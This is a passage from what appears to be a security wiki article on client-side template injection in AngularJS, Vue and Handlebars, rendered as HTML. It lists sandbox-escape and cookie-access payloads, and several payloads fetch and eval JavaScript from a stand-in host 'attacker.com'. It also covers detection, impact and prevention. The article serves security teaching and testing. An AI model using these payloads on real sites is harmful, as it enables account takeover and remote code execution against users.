+<li><code>{{ constructor.constructor( 'alert(1)' )() }}</code> to bypass regex filters.</li>
+</ul>
+</li>
+</ul>
+<hr>
+<h3 id="advanced-attack-scenarios">
+  <strong>Advanced Attack Scenarios</strong>
+  <a class="anchor" href="#advanced-attack-scenarios">#</a>
+</h3>
+<ul>
+<li>
+<p><strong>Sandbox Escapes</strong></p>
+<ul>
+<li>
+<p>Targeting older versions of Angular (1.2 - 1.5) where a &ldquo;sandbox&rdquo; attempted to prevent access to the <code>window</code> object.</p>
+</li>
+<li>
+<p><strong>Bypassing Expression Blacklists</strong></p>
+<ul>
+<li>Older AngularJS sandboxes try to block keywords like <code>window</code>, <code>document</code>, <code>constructor</code></li>
+<li>Attackers bypass using alternate paths:</li>
+</ul>
+<pre tabindex="0"><code>{{[].filter.constructor(&#39;alert(1)&#39;)()}}
+</code></pre></li>
+<li>
+<p><strong>Accessing the Global Object (<code>window</code>) Indirectly</strong></p>
+<ul>
+<li>
+<p>Even if <code>window</code> is blocked, it can be reached via prototype chains</p>
+<pre tabindex="0"><code>{{this.constructor.constructor(&#39;return window&#39;)().alert(1)}}
+</code></pre></li>
+</ul>
+</li>
+<li>
+<p><strong>Bypassing <code>$eval</code> Restrictions</strong></p>
+<ul>
+<li>If <code>$eval</code> is filtered, use its constructor</li>
+</ul>
+<pre tabindex="0"><code>{{$eval.constructor(&#39;alert(1)&#39;)() }}
+</code></pre></li>
+</ul>
+</li>
+<li>
+<p><strong>DOM-Based XSS via CSTI</strong></p>
+<ul>
+<li>Using the template engine to write to dangerous sinks like <code>innerHTML</code>.</li>
+<li>Example:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span>document.<span style="color:#a6e22e">getElementById</span>(<span style="color:#e6db74">&#39;asd&#39;</span>).<span style="color:#a6e22e">innerHTML</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&lt;script&gt;document.cookie&lt;/script&gt;&#39;</span>
+</span></span></code></pre></div></li>
+<li>
+<p><strong>Cookie Stealing</strong></p>
+<ul>
+<li>Accessing the document object via the constructor:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span>{{<span style="color:#a6e22e">constructor</span>.<span style="color:#a6e22e">constructor</span>(<span style="color:#e6db74">&#39;alert(document.cookie)&#39;</span>)()}}
+</span></span></code></pre></div></li>
+</ul>
+<hr>
+<h3 id="framework-specific-scenarios">
+  <strong>Framework Specific Scenarios</strong>
+  <a class="anchor" href="#framework-specific-scenarios">#</a>
+</h3>
+<h4 id="angularjs-1x">
+  <strong>AngularJS (1.x)</strong>
+  <a class="anchor" href="#angularjs-1x">#</a>
+</h4>
+<ul>
+<li>Classic (1.5+)</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span>{{<span style="color:#a6e22e">$on</span>.<span style="color:#a6e22e">constructor</span>(<span style="color:#e6db74">&#39;alert(1)&#39;</span>)()}}
+</span></span></code></pre></div><ul>
+<li>No Quotes</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span>{{<span style="color:#a6e22e">$on</span>.<span style="color:#a6e22e">constructor</span>(String.<span style="color:#a6e22e">fromCharCode</span>(<span style="color:#ae81ff">97</span>,<span style="color:#ae81ff">108</span>,<span style="color:#ae81ff">101</span>,<span style="color:#ae81ff">114</span>,<span style="color:#ae81ff">116</span>,<span style="color:#ae81ff">40</span>,<span style="color:#ae81ff">49</span>,<span style="color:#ae81ff">41</span>))()}}
+</span></span></code></pre></div><ul>
+<li>Dynamic Script Loader</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span>{{<span style="color:#a6e22e">constructor</span>.<span style="color:#a6e22e">constructor</span>(<span style="color:#960050;background-color:#1e0010">&#34;</span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">s</span><span style="color:#f92672">=</span>document.<span style="color:#a6e22e">createElement</span>(<span style="color:#e6db74">&#39;script&#39;</span>);<span style="color:#a6e22e">s</span>.<span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;https://attacker.com/payload.js&#39;</span>;<span style="color:#a6e22e">d</span>
+</span></span></code></pre></div><ul>
+<li>Escapes sandbox</li>
+<li>Creates a <code>&lt;script&gt;</code> tag</li>
+<li>Loads <strong>remote attacker-controlled JavaScript</strong></li>
+</ul>
+<h4 id="vuejs">
+  <strong>Vue.js</strong>
+  <a class="anchor" href="#vuejs">#</a>
+</h4>
+<ul>
+<li><strong>Standard</strong></li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span>{{<span style="color:#a6e22e">_setup</span>.<span style="color:#a6e22e">constructor</span>(<span style="color:#e6db74">&#39;alert(1)&#39;</span>)()}}
+</span></span></code></pre></div><ul>
+<li><strong>V-html abuse</strong>
+<ul>
+<li>If a developer uses <code>v-html</code> with user input, it&rsquo;s a direct XSS, but CSTI can occur if the input is parsed by the Vue compiler.</li>
+</ul>
+</li>
+<li>Runtime Template Compilation Abuse</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span>{{<span style="color:#a6e22e">constructor</span>.<span style="color:#a6e22e">constructor</span>(<span style="color:#e6db74">&#34;fetch(&#39;https://attacker.com/payload.js&#39;).then(r=&gt;r.text()).then(eval)&#34;</span>)()}}
+</span></span></code></pre></div><ul>
+<li>Fetches remote JS</li>
+<li>Executes it using <code>eval</code></li>
+<li>Works in builds where runtime compilation is enabled</li>
+</ul>
+<h4 id="handlebars--mustache">
+  <strong>Handlebars / Mustache</strong>
+  <a class="anchor" href="#handlebars--mustache">#</a>
+</h4>
+<ul>
+<li><strong>Logic-less escape</strong></li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span>{{<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">constructor</span>.<span style="color:#a6e22e">constructor</span>(<span style="color:#e6db74">&#39;alert(1)&#39;</span>)()}}
+</span></span></code></pre></div><ul>
+<li>Function Constructor → Remote Execution Chain</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span>{{<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">constructor</span>.<span style="color:#a6e22e">constructor</span>(<span style="color:#e6db74">&#34;fetch(&#39;https://attacker.com&#39;).then(r=&gt;r.text()).then(eval)&#34;</span>)()}}
+</span></span></code></pre></div><h3 id="detection-techniques">
+  <strong>Detection Techniques</strong>
+  <a class="anchor" href="#detection-techniques">#</a>
+</h3>
+<h4 id="manual-techniques">
+  <strong>Manual Techniques</strong>
+  <a class="anchor" href="#manual-techniques">#</a>
+</h4>
+<ul>
+<li><strong>Mathematical Expression</strong>
+<ul>
+<li>Submit <code>{{7*7}}</code> or <code>${7*7}</code>. If the page renders <code>49</code>, the application may have an injection attack.</li>
+</ul>
+</li>
+<li><strong>The &ldquo;Syntax&rdquo; Test</strong>
+<ul>
+<li>Submit <code>&amp;#123;&amp;#123;&amp;lt; @ $ % &amp;#125;&amp;#125;</code>. If the framework throws a console error (viewable in DevTools), it confirms the parser is active.</li>
+</ul>
+</li>
+<li><strong>Identifier Discovery</strong>
+<ul>
+<li>Try <code>{{this}}</code> to see the current scope object.</li>
+</ul>
+</li>
+</ul>
+<h3 id="automated-techniques">
+  <strong>Automated Techniques</strong>
+  <a class="anchor" href="#automated-techniques">#</a>
+</h3>
+<ul>
+<li>
+<p><strong>Burp Suite Professional</strong></p>
+<ul>
+<li>The &ldquo;DOM Invader&rdquo; extension is top tier for finding CSTI.</li>
+</ul>
+</li>
+<li>
+<p><strong>Nuclei</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#a6e22e">nuclei</span> <span style="color:#f92672">-</span><span style="color:#a6e22e">u</span> <span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//target.com -t /path/to/csti.yaml -fr
+</span></span></span></code></pre></div></li>
+</ul>
+<hr>
+<h3 id="impact">
+  <strong>Impact</strong>
+  <a class="anchor" href="#impact">#</a>
+</h3>
+<ul>
+<li><strong>Full Account Takeover</strong>
+<ul>
+<li>Stealing session tokens/cookies.</li>
+</ul>
+</li>
+<li><strong>Data Exfiltration</strong>
+<ul>
+<li>Accessing sensitive data rendered in the DOM.</li>
+</ul>
+</li>
+<li><strong>Phishing</strong>
+<ul>
+<li>Injecting fake login forms into a legitimate domain.</li>
+</ul>
+</li>
+<li><strong>Bypassing Content Security Policy</strong>
+<ul>
+<li>CSTI often bypasses CSP because the &ldquo;malicious&rdquo; script is generated by a trusted, whitelisted framework library.</li>
+</ul>
+</li>
+</ul>
+<hr>
+<h3 id="prevention-techniques">
+  <strong>Prevention Techniques</strong>
+  <a class="anchor" href="#prevention-techniques">#</a>
+</h3>
+<ul>
+<li><strong>Server-Side Escaping</strong>
+<ul>
+<li>Use a secure, server-side templating engine to neutralize characters like <code>{{</code> before they reach the client.</li>
+</ul>
+</li>
+<li><strong>Content Security Policy</strong>
+<ul>
+<li>Implement a strict CSP that disallows <code>unsafe-eval</code>.</li>
+</ul>
+</li>
+<li><strong>Avoid Dynamic Compilation</strong>
+<ul>
+<li>Don’t use <code>$compile</code> in Angular or <code>Vue.compile()</code> with user-supplied strings.</li>
+</ul>
+</li>
+<li><strong>AOT Compilation</strong>
+<ul>
+<li>Use <strong>Ahead-of-Time (AOT)</strong> compilation instead of Just-In-Time (JIT) to ensure templates are pre-compiled and static.</li>
+</ul>
+</li>
+</ul>
+<hr>
+<h3 id="tools">
+  <strong>Tools</strong>
+  <a class="anchor" href="#tools">#</a>
+</h3>
+<ul>
+<li>DOM Invader</li>
+<li>Tplmap</li>
+</ul>
+<h3 id="good-to-read">
+  <strong>Good to Read</strong>
+  <a class="anchor" href="#good-to-read">#</a>
+</h3>
+<ul>
+<li><a href="https://hackerone.com/reports/1265344" target="_blank" rel="noreferrer noopener nofollow">https://hackerone.com/reports/1265344</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></li>
+<li><a href="https://hackerone.com/reports/2234564" target="_blank" rel="noreferrer noopener nofollow">https://hackerone.com/reports/2234564</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></li>
+<li><a href="https://hackerone.com/reports/250837" target="_blank" rel="noreferrer noopener nofollow">https://hackerone.com/reports/250837</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></li>
+<li><a href="https://hackerone.com/reports/230234" target="_blank" rel="noreferrer noopener nofollow">https://hackerone.com/reports/230234</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></li>
+</ul>
+<hr>
+<h3 id="references">
+  <strong>References</strong>
+  <a class="anchor" href="#references">#</a>
+</h3>
+<ul>
+<li><a href="https://portswigger.net/web-security/cross-site-scripting/contexts/client-side-template-injection" target="_blank" rel="noreferrer noopener nofollow">PortSwigger: Client-Side Template Injection</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></li>
+<li><a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/15-Testing_for_Client-Side_Template_Injection#:~:text=To%20detect%20CSTI%2C%20testers%20should,the%20math%2C%20it%20is%20vulnerable" target="_blank" rel="noreferrer noopener nofollow">https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/15-Testing_for_Client-Side_Template_Injection#:~:text=To detect CSTI%2C testers should,the math%2C it is vulnerable</a><img src="/svg/icons8-external-link.svg" style="height: 15px;">.</li>
+<li><a href="https://www.paloaltonetworks.com/blog/cloud-security/template-injection-vulnerabilities/" target="_blank" rel="noreferrer noopener nofollow">https://www.paloaltonetworks.com/blog/cloud-security/template-injection-vulnerabilities/</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></li>
+<li><a href="https://medium.com/@s_novoselov/ssti-csti-dont-waste-your-time-c6e9fbb20743" target="_blank" rel="noreferrer noopener nofollow">https://medium.com/@s_novoselov/ssti-csti-dont-waste-your-time-c6e9fbb20743</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></li>
+<li><a href="https://javascript.plainenglish.io/client-side-template-injection-csti-e694e714ce55" target="_blank" rel="noreferrer noopener nofollow">https://javascript.plainenglish.io/client-side-template-injection-csti-e694e714ce55</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></li>
+<li><a href="https://book.hacktricks.wiki/en/pentesting-web/client-side-template-injection-csti.html" target="_blank" rel="noreferrer noopener nofollow">https://book.hacktricks.wiki/en/pentesting-web/client-side-template-injection-csti.html</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></li>
+<li><a href="https://medium.com/@sohailahmed0x0/client-side-template-injection-3df3ab6c57d9" target="_blank" rel="noreferrer noopener nofollow">https://medium.com/@sohailahmed0x0/client-side-template-injection-3df3ab6c57d9</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></li>
+<li><a href="https://www.invicti.com/web-application-vulnerabilities/angularjs-client-side-template-injection" target="_blank" rel="noreferrer noopener nofollow">https://www.invicti.com/web-application-vulnerabilities/angularjs-client-side-template-injection</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></li>
+</ul>
+</article>
+ 
+      
+
+      <footer class="book-footer">
+        
+  <div class="flex flex-wrap justify-between">
+
+
+  <div><a class="flex align-center" href="https://github.com/payatu/cybersec-wiki/commit/930cd58c048c49a6cd3c5045ba784f0e26bd6d68" title='Last modified by Suraj Kumar | August 13, 2026' target="_blank" rel="noopener">
+      <img src="/svg/calendar.svg" class="book-icon" alt="Calendar" />
+      <span>August 13, 2026</span>
+    </a>
+  </div>
+
+
+
+  <div>
+    <a class="flex align-center" href="https://github.com/payatu/cybersec-wiki/edit/main/content/docs/application-security/web/Client%20Side%20Template%20Injection%20%28CSTI%29.md" target="_blank" rel="noopener">
+      <img src="/svg/edit.svg" class="book-icon" alt="Edit" />
+      <span>Edit this page</span>
+    </a>
+  </div>
+
+
+</div>
+
+
+
+  <script>(function(){function e(e){const t=window.getSelection(),n=document.createRange();n.selectNodeContents(e),t.removeAllRanges(),t.addRange(n)}document.querySelectorAll("pre code").forEach(t=>{t.addEventListener("click",function(){e(t.parentElement),navigator.clipboard&&navigator.clipboard.writeText(t.parentElement.textContent)})})})()</script>
+
+
+ 
+        
+      </footer>
+
+      
+  
+  <div class="book-comments">
+
+</div>
+  
+ 
+
+      <label for="menu-control" class="hidden book-menu-overlay"></label>
+    </div>
+
+    
+    <aside class="book-toc">
+      <div class="book-toc-content">
+        
+  
+<nav id="TableOfContents">
+  <ul>
+    <li><a href="#client-side-template-injection-csti">Client Side Template Injection (CSTI)</a>
+      <ul>
+        <li>
+          <ul>
+            <li><a href="#definition">Definition</a></li>
+            <li><a href="#difference-between-ssti-and-csti">Difference Between SSTI and CSTI</a></li>
+            <li><a href="#attack-surfaces"><strong>Attack Surfaces</strong></a></li>
+            <li><a href="#exploitation"><strong>Exploitation</strong></a></li>
+            <li><a href="#advanced-attack-scenarios"><strong>Advanced Attack Scenarios</strong></a></li>
+            <li><a href="#framework-specific-scenarios"><strong>Framework Specific Scenarios</strong></a></li>
+            <li><a href="#detection-techniques"><strong>Detection Techniques</strong></a></li>
+            <li><a href="#automated-techniques"><strong>Automated Techniques</strong></a></li>
+            <li><a href="#impact"><strong>Impact</strong></a></li>
+            <li><a href="#prevention-techniques"><strong>Prevention Techniques</strong></a></li>
+            <li><a href="#tools"><strong>Tools</strong></a></li>
+            <li><a href="#good-to-read"><strong>Good to Read</strong></a></li>
+            <li><a href="#references"><strong>References</strong></a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+
+
+ 
+      </div>
+    </aside>
+    
+  </main>
+
+  
+</body>
+</html>
+
+
+
+
+
+
+
+
+
+
+
+
